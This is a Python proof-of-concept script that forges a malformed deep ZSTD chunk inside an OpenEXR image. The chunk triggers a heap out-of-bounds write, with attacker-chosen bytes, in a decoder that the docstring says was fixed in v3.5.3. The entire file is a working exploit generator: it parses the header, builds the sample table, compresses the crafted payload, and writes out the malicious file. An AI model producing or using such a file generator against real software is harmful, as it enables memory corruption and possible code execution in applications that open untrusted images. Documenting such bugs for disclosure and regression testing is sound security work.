#!/usr/bin/env python3
"""W184: forge a deep mixed-channel ZSTD chunk with unpacked_size >= FLOAT row.

The sample table declares N samples on the last pixel for both the FLOAT "A"
and HALF "Z" channels (grid total 6N, split 2N).  The chunk leader and inner
ZSTD frame declare U bytes split into a 2N-byte 2-element segment and a
(U-2N)-byte 4-element segment, as exr_zstd_segment_layout() requires.

With U == 4N the pinned decode sink copies the 4N-byte FLOAT row into the
in-bounds destination at offset 0, then copies the 2N-byte HALF row from the
in-bounds source at offset 0 to destination offset 4N, i.e. entirely past the
U-byte allocation.  Every byte of that second copy is the file-supplied BYTE.
The fixed v3.5.3 guard rejects the chunk before the sort.
"""
import os
import struct
import subprocess
import sys
import tempfile

BASE = sys.argv[1]
OUT = sys.argv[2]
N = int(sys.argv[3])
BYTE = int(sys.argv[4], 0)
U = int(sys.argv[5]) if len(sys.argv) > 5 else 4 * N
if U % 2 or U <= 2 * N:
    raise SystemExit("U must be even and greater than 2*N")

data = open(BASE, "rb").read()
p = 8
while True:
    if data[p] == 0:
        p += 1
        break
    p = data.index(b"\x00", p) + 1
    p = data.index(b"\x00", p) + 1
    (sz,) = struct.unpack_from("<i", data, p)
    p += 4 + sz
off0, = struct.unpack_from("<Q", data, p)
assert off0 == p + 8

q = off0
(y,) = struct.unpack_from("<i", data, q)
st_sz, pk_sz, un_sz = struct.unpack_from("<qqq", data, q + 4)
print(f"baseline y={y} samptab={st_sz} packed={pk_sz} unpacked={un_sz}")

counts = [1] * 63 + [N]
cum, tbl = 0, bytearray()
for c in counts:
    cum = max(cum, c)
    tbl += struct.pack("<I", cum)
assert len(tbl) == 64 * 4

inner = (struct.pack("<Q", 2 * N) + bytes([BYTE]) * (2 * N)
         + struct.pack("<Q", U - 2 * N) + bytes([BYTE]) * (U - 2 * N))
with tempfile.NamedTemporaryFile(delete=False) as tf:
    tf.write(inner)
    tmp = tf.name
payload = subprocess.run(["zstd", "-q", "-c", "-19", tmp],
                         capture_output=True, check=True).stdout
os.unlink(tmp)
MAGIC = 8248453963162350458
frame = (struct.pack("<Q", MAGIC) + struct.pack("<I", 1)
         + struct.pack("<I", 0) + struct.pack("<Q", len(payload)) + payload)

chunk = (struct.pack("<i", y) + struct.pack("<qqq", len(tbl), len(frame), U)
         + tbl + frame)
open(OUT, "wb").write(data[:off0] + chunk)
print(f"poc: N={N} byte=0x{BYTE:02x} U={U} grid={6*N} split={2*N} "
      f"COPY1={4*N} COPY2={2*N} at dst+{4*N} frame={len(frame)} wrote={len(data[:off0]+chunk)}")
